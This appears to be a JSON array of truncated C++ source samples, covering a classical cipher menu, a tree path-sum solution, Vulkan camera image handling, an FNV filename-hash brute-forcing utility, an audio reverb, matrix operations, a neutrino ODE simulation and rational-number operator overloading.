if(choice==\"J\"){\n        morse_main();\n    }\n\n    // different condition for message other than the previous ciphers\n    msg = display(msg);\n    if (choice == \"A\")Atbash(msg);\n\n    else if(choice==\"E\")Rail_fence(msg);\n}\nstring display(string msg){\n    //  takes message user wants to encrypt or decrypt and validates it\n    cout<<\"Please enter your message: \"<<endl;\n    cin.ignore();\n    getline(cin,msg);\n    msg= ignore_statement(msg);\n    while(msg.empty()){\n        cout<<\"Please enter a valid message: \"<<endl;\n        getline(cin,msg);\n        msg= ignore_statement(msg);\n\n    }\n\n    while(msg.empty() || !checker_string(msg)){\n        cout<<\"Please enter a valid message: \"<<endl;\n        getline(cin,msg);\n        msg= ignore_statement(msg);\n    }\n    cout<<endl;\n    return msg;\n}\nstring menu(){\n    // function that displays all encryption styles for user to choose from\n    string choice;\n    string msg;\n\n    cout<<\"Here are the cipher styles\"<<endl;\n    cout<<\"A. Atbash Cipher\"<<endl;\n    cout<<\"B. Baconian Cipher\"<<endl;\n    cout<<\"C. Polybius Square Cipher\"<<endl;\n    cout<<\"D. Simple Substitution Cipher\"<<endl;\n    cout<<\"E. Rail Fence Cipher\"<<endl;\n    cout<<\"F. Route Cipher\"<<endl;\n    cout<<\"G. Vignere Cipher\"<<endl;\n    cout<<\"H. XOR Cipher\"<<endl;\n    cout<<\"I. Affine Cipher\"<<endl;\n    cout<<\"J. Morse Cipher\"<<endl;\n    cout<<\"K. exit\"<<endl;\n    cout<<\"Please choose according to corresponding alphabet: \"<<endl;\n    cin>>choice;\n\n    // making sure",
    "#include <iostream>\n#include \"BinaryTree.h\"\nusing namespace std;\n\n// TODO: solution breath first search\n/**\n * traverser all level\n*/\n/**\n * target function\n*/\nvoid Solution::dfs_sum(TreeNode *currentNode, int targetSum, int& currentSum, vector<int>& curPath, vector<vector<int>>& ans)\n{\n    // base case\n    if (!currentNode) return;\n    currentSum += currentNode->val;\n    curPath.push_back(currentNode->val);\n    dfs_sum(currentNode->left, targetSum, currentSum, curPath, ans);\n    dfs_sum(currentNode->right, targetSum, currentSum, curPath, ans);\n\n    // confirm result\n    if (!currentNode->left && !currentNode->right) {\n        if (currentSum == targetSum) {\n            ans.push_back(curPath);\n        }\n    }\n    // remove current node\n    curPath.pop_back();\n    currentSum -= currentNode->val;\n}\n\n\n/**\n * target method\n*/\nvector<vector<int>> Solution::pathSum(TreeNode *root, int targetSum)\n{\n    int curSum = 0;\n    vector<vector<int>> ans;\n    vector<int> curPath;\n    dfs_sum(root, targetSum, curSum, curPath, ans);\n    return ans;\n}",
    "//\n// Created by ts on 2023/7/18.\n//\n#include \"VkCameraImage.h\"\n#include \"VulkanCommon.h\"\n#include \"VkHelper.h\"\n\nVkCameraImage::VkCameraImage(VkBundle *vk, AHardwareBuffer *hb) {\n    AHardwareBuffer_Desc bufferDesc;\n    AHardwareBuffer_describe(hb, &bufferDesc);\n\n    mDataSize = bufferDesc.width * bufferDesc.height * bufferDesc.layers;\n\n    // query format properties\n    VkAndroidHardwareBufferFormatPropertiesANDROID formatInfo = {\n            .sType = VK_STRUCTURE_TYPE_ANDROID_HARDWARE_BUFFER_FORMAT_PROPERTIES_ANDROID,\n            .pNext = nullptr,\n    };\n    VkAndroidHardwareBufferPropertiesANDROID propertiesInfo = {\n            .sType = VK_STRUCTURE_TYPE_ANDROID_HARDWARE_BUFFER_PROPERTIES_ANDROID,\n            .pNext = &formatInfo\n    };\n    CALL_VK(vkGetAndroidHardwareBufferPropertiesANDROID(vk->deviceInfo.device, hb, &propertiesInfo));\n\n    // build sampler ycbcr create info\n    VkExternalFormatANDROID externalFormat = {\n            .sType = VK_STRUCTURE_TYPE_EXTERNAL_FORMAT_ANDROID,\n            .pNext = nullptr\n    };\n    VkSamplerYcbcrConversionCreateInfo convInfo = {\n            .sType = VK_STRUCTURE_TYPE_SAMPLER_YCBCR_CONVERSION_CREATE_INFO,\n            .pNext = nullptr\n    };\n    if(formatInfo.format == VK_FORMAT_UNDEFINED)\n    {\n        externalFormat.externalFormat = formatInfo.externalFormat;\n        convInfo.pNext = &externalFormat;\n        convInfo.format = VK_FORMAT_UNDEFINED;\n        convInfo.ycbcrModel = formatInfo.suggestedYcbcrModel;\n    }\n    else\n    {\n        convInfo.pNext = &externalFormat;\n        convInfo.format = formatInfo.format;\n        convInfo.ycbcrModel = VK_SAMPLER_YCBCR_MODEL_CONVERSION_YCBCR_709;\n    }\n    convInfo.ycbcrRange = formatInfo.suggestedYcbcrRange;\n    convInfo.components = formatInfo.samplerYcbcrConversionComponents;\n    convInfo.xChromaOffset = formatInfo.suggestedXChromaOffset;\n    convInfo.yChromaOffset = formatInfo.suggestedYChromaOffset;\n    convInfo.chromaFilter = VK_FILTER_NEAREST;\n    convInfo.forceExplicitReconstruction = false;\n    CALL_VK(vkCreateSamplerYcbcrConversion(vk->deviceInfo.device, &convInfo, VK_ALLOC, &mConversion));\n\n    VkSamplerYcbcrConversionInfo samplerYcbcrConversionInfo = {\n            .sType = VK_STRUCTURE_TYPE_SAMPLER_YCBCR_CONVERSION_INFO,\n            .pNext = nullptr,\n            .conversion = mConversion\n    };\n\n    //create sampler\n    VkSamplerCreateInfo samplerCreateInfo = {\n            .sType = VK_STRUCTURE_TYPE_SAMPLER_CREATE_INFO,\n            .pNext = &samplerYcbcrConversionInfo,\n            .flags = 0,\n            .magFilter = VK_FILTER_NEAREST,\n            .minFilter = VK_FILTER_NEAREST,\n            .mipmapMode = VK_SAMPLER_MIPMAP_MODE_NEAREST,\n            .addressModeU = VK_SAMPLER_ADDRESS_MODE_CLAMP_TO_EDGE,\n            .addressModeV = VK_SAMPLER_ADDRESS_MODE_CLAMP_TO_EDGE,\n            .addressModeW = VK_SAMPLER_ADDRESS_MODE_CLAMP_TO_EDGE,\n            .mipLodBias = 0.0f,\n            .anisotropyEnable = false,\n            .maxAnisotropy = 1.0f,\n            .compareEnable = false,\n            .compareOp = VK_COMPARE_OP_NEVER,\n            .minLod = 0.0f,\n            .maxLod = 0.0f,\n            .borderColor = VK_BORDER_COLOR_FLOAT_OPAQUE_WHITE,\n            .unnormalizedCoordinates = false\n    };\n    CALL_VK(vkCreateSampler(vk->deviceInfo.device, &samplerCreateInfo, VK_ALLOC, &mSampler));\n}\n\nvoid VkCameraImage::update(VkBundle *vk, VkImageUsageFlags usage, VkSharingMode sharingMode, AHardwareBuffer *hb) {\n    vkDeviceWaitIdle(vk->deviceInfo.device);\n\n    //destroy resources\n    destroyResources(vk, false);\n\n    AHardwareBuffer_Desc bufferDesc;\n    AHardwareBuffer_describe(hb, &bufferDesc);\n\n    if(bufferDesc.width * bufferDesc.height * bufferDesc.layers != mDataSize)\n        throw std::runtime_error{\"Data size differs. Cannot update image.\"};\n\n    // query format properties\n    VkAndroidHardwareBufferFormatPropertiesANDROID formatInfo = {\n            .sType = VK_STRUCTURE_TYPE_ANDROID_HARDWARE_BUFFER_FORMAT_PROPERTIES_ANDROID,\n    };\n    VkAndroidHardwareBufferPropertiesANDROID propertiesInfo = {\n            .sType = VK_STRUCTURE_TYPE_ANDROID_HARDWARE_BUFFER_PROPERTIES_ANDROID,\n            .pNext = &formatInfo\n    };\n    CALL_VK(vkGetAndroidHardwareBufferPropertiesANDROID(vk->deviceInfo.device, hb, &propertiesInfo));\n\n    VkExternalMemoryImageCreateInfo extMemInfo = {\n            .sType = VK_STRUCTURE_TYPE_EXTERNAL_MEMORY_IMAGE_CREATE_INFO,\n            .pNext = nullptr,\n            .handleTypes = VK_EXTERNAL_MEMORY_HANDLE_TYPE_ANDROID_HARDWARE_BUFFER_BIT_ANDROID\n    };\n\n//    VkPhysicalDeviceImageFormatInfo2 physicalDevImgFmtInfo2 = {\n//            .sType = VK_STRUCTURE_TYPE_PHYSICAL_DEVICE_IMAGE_FORMAT_INFO_2,\n//            .pNext = nullptr,\n//            .format = VK_FORMAT_UNDEFINED,\n//            .type = VK_IMAGE_TYPE_2D,\n//            .tiling = VK_IMAGE_TILING_LINEAR,\n//            .usage = VK_IMAGE_USAGE_SAMPLED_BIT,\n//            .flags = 0\n//    };\n//    VkImageFormatProperties2 imgFmtProps2 = {\n//            .sTy",
    "#include <iostream>\n#include \"crack.hpp\"\n\n// using a known initial string just to test\nvoid example_1() {\n    printf(\"--- EXAMPLE 1 ---\\n\");\n    using FNV_t = FNVUtil<>;\n    using CrackUtils_t = CrackUtils<>;\n\n    // setup\n    auto crack = CrackUtils_t();\n    string to_hash = \"known/crackmelol.exe\";\n    uint64_t hashed = FNV_t::hash(to_hash);\n\n    // var to store cracked string if found\n    string result;\n\n    // max string length without needing to brute force is 8\n    // since the string we want to crack is of length 10, we need 2 chars of brute force\n    constexpr int BRUTE_CHARS = 2;\n\n    // adding known prefix and suffix (useful if you're trying to crack a hashed filename)\n    const string known_prefix = \"known/\";\n    const string known_suffix = \".exe\";\n    \n    // crack\n    printf(\"Trying to crack: 0x%016lX\\n\", hashed);\n    if (crack.try_crack_single(result, hashed, to_hash.size(), BRUTE_CHARS, known_prefix, known_suffix)) {\n        printf(\"Found! %s\\n\", result.c_str());\n    } else {\n        printf(\"Failed ):\\n\");\n    }\n\n    printf(\"\\n\");\n}\n\n// example of cracking hash without knowing what it is beforehand\nvoid example_2() {\n    printf(\"--- EXAMPLE 2 ---\\n\");\n    using CrackUtils_t = CrackUtils<>;\n\n    // setup\n    auto crack = CrackUtils_t();\n\n    // hashed string we want to crack\n    uint64_t hashed = 0xC5BE054CB26B3829;\n\n    // var to store cracked string if we find it\n    string result;\n\n    // max string length to try to crack\n    constexpr int MAX_LEN = 10;\n\n    // crack\n    printf(\"Trying to crack: 0x%016lX\\n\", hashed);\n\n    // note the use of brute_n, this just runs try_crack_single with lengths [1, MAX_LEN]\n    if (crack.brute_n(result, hashed, MAX_LEN)) {\n        printf(\"Found! %s\\n\", result.c_str());\n    } else {\n        printf(\"Failed ):\\n\");\n    }\n\n    printf(\"\\n\");\n}\n\n// cracking hash that's truncated to 63 bits which uses a different offset basis and prime\nvoid example_3() {\n    printf(\"--- EXAMPLE 3 ---\\n\");\n    constexpr uint64_t OFFSET_BASIS = 0xE4A68FF7D4912FD2;\n    constexpr uint64_t PRIME = PRIME_233;\n    constexpr uint32_t BIT_LEN = 63;\n\n    using FNV_t = FNVUtil<OFFSET_BASIS, PRIME, BIT_LEN>;\n    using CrackUtils_t = CrackUtils<OFFSET_BASIS, PRIME, BIT_LEN>;\n\n    // setup (everything below is copied from the first example)\n    auto crack = CrackUtils_t();\n    string to_hash = \"known/crackmelol.exe\";\n    uint64_t hashed = FNV_t::hash(to_hash);\n\n    // var to store cracked string if found\n    string result;\n\n    // max string length without needing to brute force is 8\n    // since the string we want to crack is of length 10, we need 2 chars of brute force\n    constexpr int BRUTE_CHARS = 2;\n\n    // adding known prefix and suffix (useful if you're trying to crack a hashed filename)\n    const string known_prefix = \"known/\";\n    const string known_suffix = \".exe\";\n    \n    // crack\n    printf(\"Trying to crack: 0x%016lX\\n\", hashed);\n    if (crack.try_crack_single(result, hashed, to_hash.size(), BRUTE_CHARS, known_prefix, known_suffix)) {\n        printf(\"Found! %s\\n\", result.c_str());\n    } else {\n        printf(\"Failed ):\\n\");\n    }\n\n    printf(\"\\n\");\n}\n\n// cracking hash and using a character list to help avoid returning weird collisions\nvoid example_4() {\n    printf(\"--- EXAMPLE 4 ---\\n\");\n\n    using FNV_t = FNVUtil<>;\n    using CrackUtils_t = CrackUtils<>;\n\n    // list of valid characters\n    string charset = \"0123456789abcdef\";\n\n    // you can also use some of the presets defined in crack.hpp\n    /*\n    namespace presets {\n        static std::string valid = \"0123456789abcdefghijklmnopqrstuvwxyz!\\\"#$%&'()*+,-./:;<=>?@[]^_`{|}~ \";\n        static std::string valid_func = \"0123456789abcdefghijklmnopqrstuvwxyz_\";\n        static std::string valid_file = \"0123456789abcdefghijklmnopqrstuvwxyz_./\";\n        static std::string valid_gsc = \"0123456789abcdefghijklmnopqrstuvwxyz_./:\";\n    }\n\n    Ex: string charset = presets::valid_file;\n    */\n\n    // setup\n    auto crack = CrackUtils_t(charset);\n    string to_hash = \"abc9784def\";\n    uint64_t hashed = FNV_t::hash(to_hash);\n\n    // var to store cracked string if found\n    string result;\n\n    // max string length without needing to brute force is 8\n    // since the string we want to crack is of length 10, we need 2 chars of brute force\n    constexpr int BRUTE_CHARS = 2;\n    \n    // crack\n    printf(\"Trying to crack: 0x%016lX\\n\", hashed);\n    if (crack.try_crack_single(result, hashed, to_hash.size(), BRUTE_CHARS)) {\n        printf(\"Found! %s\\n\", result.c_str());\n    } else {\n        printf(\"Failed ):\\n\");\n    }\n\n    printf(\"\\n\");\n}\n\n// example usages\nint main() {\n    example_1();\n    example_2();\n    example_3();\n    example_4();\n\n    return 0;\n}",
    "#include \"daisysp.h\"\n#include \"daisy_seed.h\"\n\n// Interleaved audio definitions\n#define LEFT (i)\n#define RIGHT (i + 1)\n\nusing namespace daisysp;\nusing namespace daisy;\n\nstatic DaisySeed hw;\n\n// Number of delay lines\n#define DEL_NUM 4U\n\n// Declare FDN DelayLines\nstatic DelayLine<float, 4999U + 1U> FDN_del[DEL_NUM];\n\n// Declare LPF DelayLines\nstatic DelayLine<float, 1U> lpf_del[DEL_NUM];\n\n// Declare APF DelayLines\nstatic DelayLine<float, 557U + 1U> apf_del[DEL_NUM];\n\n// FDN feedback matrix - 4x4\nconst signed char hadamard_matrix[DEL_NUM][DEL_NUM] = {\n{  1,  1,  1,  1  },\n{ -1,  1, -1,  1  },\n{ -1, -1,  1,  1  },\n{  1, -1, -1,  1  }\n};\n\n// Matrix scalar for Hadamard\n#define MATRIX_SCALAR 0.5f\n\n// Number of primes\n#define PRIMES_NUM 669\n\nconst unsigned short primes[PRIMES_NUM] = {\n2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97,101,103,107,109,113,127,131,137,139,149,151,157,163,167,173,179,181,191,193,197,199,211,223,227,229,233,239,241,251,257,263,269,271,277,281,283,293,307,311,313,317,331,337,347,349,353,359,367,373,379,383,389,397,401,409,419,421,431,433,439,443,449,457,461,463,467,479,487,491,499,503,509,521,523,541,547,557,563,569,571,577,587,593,599,601,607,613,617,619,631,641,643,647,653,659,661,673,677,683,691,701,709,719,727,733,739,743,751,757,761,769,773,787,797,809,811,821,823,827,829,839,853,857,859,863,877,881,883,887,907,911,919,929,937,941,947,953,967,971,977,983,991,\n997,1009,1013,1019,1021,1031,1033,1039,1049,1051,1061,1063,1069,1087,1091,1093,1097,1103,1109,1117,1123,1129,1151,1153,1163,1171,1181,1187,1193,1201,1213,1217,1223,1229,1231,1237,1249,1259,1277,1279,1283,1289,1291,1297,1301,1303,1307,1319,1321,1327,1361,1367,1373,1381,1399,1409,1423,1427,1429,1433,1439,1447,1451,1453,1459,1471,1481,1483,1487,1489,1493,1499,1511,1523,1531,1543,1549,1553,1559,1567,1571,1579,1583,1597,1601,1607,1609,1613,1619,1621,1627,1637,1657,1663,1667,1669,1693,1697,1699,1709,1721,1723,1733,1741,1747,1753,1759,1777,1783,1787,1789,1801,1811,1823,1831,1847,1861,1867,1871,1873,1877,1879,1889,1901,1907,1913,1931,1933,\n1949,1951,1973,1979,1987,1993,1997,1999,2003,2011,2017,2027,2029,2039,2053,2063,2069,2081,2083,2087,2089,2099,2111,2113,2129,2131,2137,2141,2143,2153,2161,2179,2203,2207,2213,2221,2237,2239,2243,2251,2267,2269,2273,2281,2287,2293,2297,2309,2311,2333,2339,2341,2347,2351,2357,2371,2377,2381,2383,2389,2393,2399,2411,2417,2423,2437,2441,2447,2459,2467,2473,2477,2503,2521,2531,2539,2543,2549,2551,2557,2579,2591,2593,2609,2617,2621,2633,2647,2657,2659,2663,2671,2677,2683,2687,2689,2693,2699,2707,2711,2713,2719,2729,2731,2741,2749,2753,2767,2777,2789,2791,2797,2801,2803,2819,2833,2837,2843,2851,2857,2861,2879,2887,2897,2903,2909,2917,2927,\n2939,2953,2957,2963,2969,2971,2999,3001,3011,3019,3023,3037,3041,3049,3061,3067,3079,3083,3089,3109,3119,3121,3137,3163,3167,3169,3181,3187,3191,3203,3209,3217,3221,3229,3251,3253,3257,3259,3271,3299,3301,3307,3313,3319,3323,3329,3331,3343,3347,3359,3361,3371,3373,3389,3391,3407,3413,3433,3449,3457,3461,3463,3467,3469,3491,3499,3511,3517,3527,3529,3533,3539,3541,3547,3557,3559,3571,3581,3583,3593,3607,3613,3617,3623,3631,3637,3643,3659,3671,3673,3677,3691,3697,3701,3709,3719,3727,3733,3739,3761,3767,3769,3779,3793,3797,3803,3821,3823,3833,3847,3851,3853,3863,3877,3881,3889,3907,3911,3917,3919,3923,3929,3931,3943,3947,3967,3989,4001,\n4003,4007,4013,4019,4021,4027,4049,4051,4057,4073,4079,4091,4093,4099,4111,4127,4129,4133,4139,4153,4157,4159,4177,4201,4211,4217,4219,4229,4231,4241,4243,4253,4259,4261,4271,4273,4283,4289,4297,4327,4337,4339,4349,4357,4363,4373,4391,4397,4409,4421,4423,4441,4447,4451,4457,4463,4481,4483,4493,4507,4513,4517,4519,4523,4547,4549,4561,4567,4583,4591,4597,4603,4621,4637,4639,4643,4649,4651,4657,4663,4673,4679,4691,4703,4721,4723,4729,4733,4751,4759,4783,4787,4789,4793,4799,4801,4813,4817,4831,4861,4871,4877,4889,4903,4909,4919,4931,4933,4937,4943,4951,4957,4967,4969,4973,4987,4993,4999\n};\n\nunsigned int selectedPrimes[DEL_NUM];\n\n// G gains\nfloat g[DEL_NUM] = {0.805f, 0.827f, 0.783f, 0.764f};\n\nfloat u, sig_out;\nfloat lpf_y[DEL_NUM];\nfloat apf_del_out, apf_feedback, apf_y; //[DEL_NUM];\nfloat FDN_del_out[DEL_NUM]; // delay outs\nfloat FDN_feedback;\nunsigned char idx, r, c; // for-loop variables\n\nfloat wetCV;\nfloat lengthCV;\nfloat densityCV;\n\n\nstatic void AudioCallback(AudioHandle::InterleavingInputBuffer  in,\n                          AudioHandle::InterleavingOutputBuffer out,\n                          size_t                                size)\n{\n\n    for(size_t i = 0; i < size; i += 2)\n    {\n\n        u = 0.5f * (in[LEFT] + in[RIGHT]); // mono input\n\n        // Process delay outs and output signal\n        sig_out = 0.0f;\n        for(idx = 0; idx < DEL_NUM; idx++){\n            FDN_del_out[idx] = FDN_del[idx].Read();\n            sig_out += FDN_del_out[idx] / 4.0f;\n\n\t\t\t// LPF\n            lpf_y[idx] = (0.8f * FDN_del_out[idx]) + (0.2f * lpf_del[idx].Read());\n            lpf_del[idx].Write(lpf_y[idx]);\n\n\t\t\t// APF\n\t\t\t//apf_del_out = apf",
    "#include <iostream>\r\nclass Matrix {\r\n int a[5][5], b[5][5], c[5][5], d[5][5], e[5][5], f[5][5];\r\n int p, q, i, j, k, n, m;\r\npublic:\r\n void get();\r\n void add();\r\n void sub();\r\n void trans();\r\n void mul();\r\n};\r\nvoid Matrix::get() {\r\n std::cout << \"\\nEnter Number of Rows & Columns for the first matrix: \";\r\n std::cin >> n >> m;\r\n std::cout << \"\\nEnter the first Matrix:\\n\";\r\n for (i = 0; i < n; i++) {\r\n for (j = 0; j < m; j++) {\r\n std::cin >> a[i][j];\r\n }\r\n }\r\n std::cout << \"\\nEnter Number of Rows & Columns for the second matrix: \";\r\n std::cin >> p >> q;\r\n std::cout << \"\\nEnter the second Matrix:\\n\";\r\n for (i = 0; i < p; i++) {\r\n for (j = 0; j < q; j++) {\r\n std::cin >> b[i][j];\r\n }\r\n }\r\n}\r\nvoid Matrix::add() {\r\n std::cout << \"\\nThe addition of two matrices is :\\n\";\r\n for (i = 0; i < n; i++) {\r\n for (j = 0; j < m; j++) {\r\n c[i][j] = a[i][j] + b[i][j];\r\n std::cout << c[i][j] << \"\\t\";\r\n }\r\n std::cout << std::endl;\r\n }\r\n}\r\nvoid Matrix::sub() {\r\n std::cout << \"\\nThe subtraction of two matrices is :\\n\";\r\n for (i = 0; i < n; i++) {\r\n for (j = 0; j < m; j++) {\r\n d[i][j] = a[i][j] - b[i][j];\r\n std::cout << d[i][j] << \"\\t\";\r\n }\r\n std::cout << std::endl;\r\n }\r\n}\r\nvoid Matrix::trans() {\r\n std::cout << \"\\nThe transpose of the first matrix is :\\n\";\r\n for (i = 0; i < n; i++) {\r\n for (j = 0; j < m; j++) {\r\n e[i][j] = a[j][i];\r\n std::cout << e[i][j] << \"\\t\";\r\n }\r\n std::cout << std::endl;\r\n }\r\n}\r\nvoid Matrix::mul() {\r\n std::cout << \"\\nThe multiplication of two matrices is :\\n\";\r\n if (m != p) {\r\n std::cout << \"Matrix multiplication is not possible.\" << std::endl;\r\n return;\r\n }\r\n for (i = 0; i < n; i++) {\r\n for (j = 0; j < q; j++) {\r\n c[i][j] = 0;\r\n for (k = 0; k < p; k++) {\r\n c[i][j] += a[i][k] * b[k][j];\r\n }\r\n std::cout << c[i][j] << \"\\t\";\r\n }\r\n std::cout << std::endl;\r\n }\r\n}\r\nint main() {\r\n Matrix m;\r\n m.get();\r\n m.add();\r\n m.sub();\r\n m.trans();\r\n m.mul();\r\n return 0;\r\n}\r\n\r\n",
    "#include <iostream>\n#include <iomanip>\n#include <string>\n#include <fstream>\n#include <boost/algorithm/string.hpp>\n#include <boost/numeric/odeint.hpp> // odeint function definitions\n#include <math.h>\n#include <cmath>\n#include <omp.h>\n#include <boost/math/special_functions/cos_pi.hpp>\n#include <boost/math/special_functions/sin_pi.hpp>\n#include <stdexcept>\n#include <boost/throw_exception.hpp>\n#include <boost/numeric/odeint/stepper/stepper_categories.hpp>\n#include <boost/numeric/odeint/stepper/controlled_step_result.hpp>\n#include <boost/numeric/odeint/integrate/max_step_checker.hpp>\n#include <boost/numeric/odeint/integrate/detail/integrate_const.hpp>\n#include <boost/numeric/odeint/util/bind.hpp>\n#include <boost/numeric/odeint/util/unwrap_reference.hpp>\n#include <boost/numeric/odeint/util/copy.hpp>\n#include <boost/numeric/odeint/util/detail/less_with_sign.hpp>\n#include <boost/numeric/odeint/integrate/null_observer.hpp>\n#include <iostream>\n#include <omp.h>\nusing namespace std;\nusing namespace boost::numeric::odeint;\ntypedef std::vector< double> state_type;\nofstream fp;\n#define costhslices 3000\n#define xslices 1\n#define yslices 1\ndouble theta=0.15;\ndouble omega=1.0e0;\ndouble lam=1.0e3;\ndouble alpha=4.0e0/3.0e0;\ndouble c=3.0e5; // speed of light in km per sec\ndouble mup=1.0e3;\nint tsize = 8*costhslices*xslices*yslices;\ndouble costharray[costhslices];\ndouble cosdtharray[costhslices];\ndouble d[8*xslices*yslices];\ndouble dc[8*xslices*yslices];\nvoid my_observer( const state_type &x, const double t );\ndouble normal(double x, double sig,double mean)\n{\n    double ans;\n    //ans=1.0e0/(sqrt(2.0e0*M_PI*sig*sig));\n    ans=1.0e0*exp(-(x-mean)*(x-mean)/(2.0e0*sig*sig));\n    return(ans);\n}\n\ndouble mupt(const double t)\n{\n    double ans;\n    //ans = mup; // constant\n    ans = 3.0e0 * mup * exp(-1.0e0*c/10.0e0 * t) ; // exp, rate is 1km^-1\n    return(ans);\n}\n\n\nvoid initarrays(state_type &x)\n{\n\n    // init arrays\n    for(int k=0;k<costhslices;k++)\n    {\n        double costhmin = -1.0e0;\n        double costhmax = +1.0e0;\n        costharray[k] = costhmin + ((costhmax-costhmin)*(0.5e0+(double)k))*1.0e0/(double)costhslices;\n        cosdtharray[k] = (costhmax-costhmin)*1.0e0/(double)costhslices;\n        \n    }\n\n    for(int i=0;i<xslices;i++)\n    {\n        for(int j=0;j<yslices;j++)\n        {\n            for(int k=0;k<costhslices;k++)\n            {\n\n                x[i*yslices*costhslices*8+j*costhslices*8+k*8+0] = 1.0e0; // neutrinos\n                x[i*yslices*costhslices*8+j*costhslices*8+k*8+4] = alpha; // anti-neutrinos\n\n                x[i*yslices*costhslices*8+j*costhslices*8+k*8+1]=0.0e0;\n                x[i*yslices*costhslices*8+j*costhslices*8+k*8+2]=0.0e0;\n                x[i*yslices*costhslices*8+j*costhslices*8+k*8+3]=0.0e0;   // seed?\n\n                x[i*yslices*costhslices*8+j*costhslices*8+k*8+5]=0.0e0;\n                x[i*yslices*costhslices*8+j*costhslices*8+k*8+6]=0.0e0;\n                x[i*yslices*costhslices*8+j*costhslices*8+k*8+7]=0.0e0;\n            }\n        }\n    }\n\n}\n\n\n\n\nvoid my_system( const state_type &x , state_type &dxdt , const double t )\n{\n    //std::cout<<\"t=\"<<t<<endl;\n    for(int i=0;i<tsize;i++)\n    {\n\t    dxdt[i]=0.0e0;\n    }\n    for(int i=0;i<xslices;i++)\n    {\n        for(int j=0;j<yslices;j++)\n        {\n            for(int l=0;l<8;l++)\n            {\n                d[i*yslices*8+j*8+l]=0.0e0;\n                dc[i*yslices*8+j*8+l]=0.0e0;\n            }\n        }\n    }\n    \n\n    int th_id;\n    int nthreads;\n    #pragma omp parallel private(th_id)\n    {\n        nthreads=omp_get_num_threads();\n        th_id = omp_get_thread_num();\n        //for(int i=0;i<xslices;i++)\n        for(int ip=0;(ip+th_id)<xslices;ip=ip+nthreads)\n        {\n            int i=ip+th_id;\n            for(int j=0;j<yslices;j++)\n            {\n                for(int k=0;k<costhslices;k++)\n                {\n                    for(int l=0;l<8;l++)\n                    {\n                        d[i*yslices*8+j*8+l]=d[i*yslices*8+j*8+l] + mupt(t)*x[i*yslices*costhslices*8+j*costhslices*8+k*8+l]*cosdtharray[k];\n                        dc[i*yslices*8+j*8+l]=dc[i*yslices*8+j*8+l] + mupt(t)*costharray[k]*x[i*yslices*costhslices*8+j*costhslices*8+k*8+l]*cosdtharray[k];\n                    }\n                }\n            }\n        }\n    } //pragma loop ends here\n//int th_id;\n//int nthreads;\n    \n#pragma omp parallel private(th_id)\n{\n    nthreads=omp_get_num_threads();\n    th_id = omp_get_thread_num();\n    //std::cout<<\"nthread = \"<<nthreads<<\"th_id = \"<<th_id<<endl;\n    //for(int i=0;i<xslices;i++)\n    for(int ip=0;(ip+th_id)<xslices;ip=ip+nthreads)\n    {\n\tint i=ip+th_id;\n        for(int j=0;j<yslices;j++)\n        {\n            \n\t    for(int k=0;k<costhslices;k++)\n            {\n\t\t\n// Vacuum Hamiltonian\ndxdt[i*yslices*costhslices*8+j*costhslices*8+k*8+0]=dxdt[i*yslices*costhslices*8+j*costhslices*8+k*8+0]+2.0e0*omega*x[i*yslices*costhslices*8+j*costhslices*8+k*8+3]*sin(2.0e0*theta);\ndxdt[i*yslices*costhslices*8+j*costhslices*8+k*8+1]=dxdt[i*ysl",
    "//Eitan Brown 346816549\n//operator overloading\n//Main function given via moodle\n#include\"Rational.h\"\n#include <iostream>\nusing namespace std;\n\nenum OPERATOR {\n\tEXIT, ADD_PRE, ADD_POST, SUB_PRE, SUB_POST, ADD, SUB, MULT, DIV,\n\tGREATER, LESS_THAN, GREATER_OR_EQUAL, LESS_OR_EQUAL, EQUAL, NOT_EQUAL\n};\nint main()\n{\n\tint numerator, denominator;\n\tchar junk;\n\tint op;\n\tcout << \"enter your choice:\" << endl;\n\tcin >> op;\n\tRational r2, r3;\n\twhile (op != EXIT) {\n\t\tcout << \"enter a rational number:\" << endl;\n\t\tcin >> numerator >> junk >> denominator;\n\t\tRational r1(numerator, denominator);\n\t\tif (op >= 5) {\n\t\t\tcout << \"enter a rational number:\" << endl;\n\t\t\tcin >> numerator >> junk >> denominator;\n\t\t\tr2.setNumerator(numerator);\n\t\t\tr2.setDenominator(denominator);\n\t\t}\n\t\tswitch (op) {\n\t\tcase ADD_PRE:\n\t\t\tcout << \"x = ++y;\" << endl;\n\t\t\tcout << \"before operation y is: \";\n\t\t\tr1.print();\n\t\t\tr3 = ++r1;\n\t\t\tcout << endl;\n\t\t\tcout << \"after operation x is: \";\n\t\t\tr3.print();\n\t\t\tcout << endl << \"y is: \";\n\t\t\tr1.print();\n\t\t\tbreak;\n\t\tcase ADD_POST:\n\t\t\tcout << \"x = \" << \" y++;\" << endl;\n\t\t\tcout << \"before operation y is: \";\n\t\t\tr1.print();\n\t\t\tr3 = r1++;\n\t\t\tcout << endl;\n\t\t\tcout << \"after operation x is: \";\n\t\t\tr3.print();\n\t\t\tcout << endl << \"y is: \";\n\t\t\tr1.print();\n\t\t\tbreak;\n\t\tcase SUB_PRE:\n\t\t\tcout << \"x = --y;\" << endl;\n\t\t\tcout << \"before operation y is: \";\n\t\t\tr1.print();\n\t\t\tr3 = --r1;\n\t\t\tcout << endl;\n\t\t\tcout << \"after operation x is: \";\n\t\t\tr3.print();\n\t\t\tcout << endl << \"y is: \";\n\t\t\tr1.print();\n\t\t\tbreak;\n\t\tcase SUB_POST:\n\t\t\tcout << \"x = \" << \" y--;\" << endl;\n\t\t\tcout << \"before operation y is: \";\n\t\t\tr1.print();\n\t\t\tr3 = r1--;\n\t\t\tcout << endl;\n\t\t\tcout << \"after operation x is: \";\n\t\t\tr3.print();\n\t\t\tcout << endl << \"y is: \";\n\t\t\tr1.print();\n\t\t\tbreak;\n\t\tcase ADD:\n\t\t\tr3 = r1 + r2;\n\t\t\tr1.print();\n\t\t\tcout << \" + \";\n\t\t\tr2.print();\n\t\t\tcout << \" = \";\n\t\t\tr3.print();\n\t\t\tbreak;\n\t\tcase SUB:\n\t\t\tr3 = r1 - r2;\n\t\t\tr1.print();\n\t\t\tcout << \" - \";\n\t\t\tr2.print();\n\t\t\tcout << \" = \";\n\t\t\tr3.print();\n\t\t\tbreak;\n\t\tcase MULT:\n\t\t\tr3 = r1 * r2;\n\t\t\tr1.print();\n\t\t\tcout << \" * \";\n\t\t\tr2.print();\n\t\t\tcout << \" = \";\n\t\t\tr3.print();\n\t\t\tbreak;\n\t\tcase DIV:\n\t\t\tr3 = r1 / r2;\n\t\t\tr1.print();\n\t\t\tcout << \" / 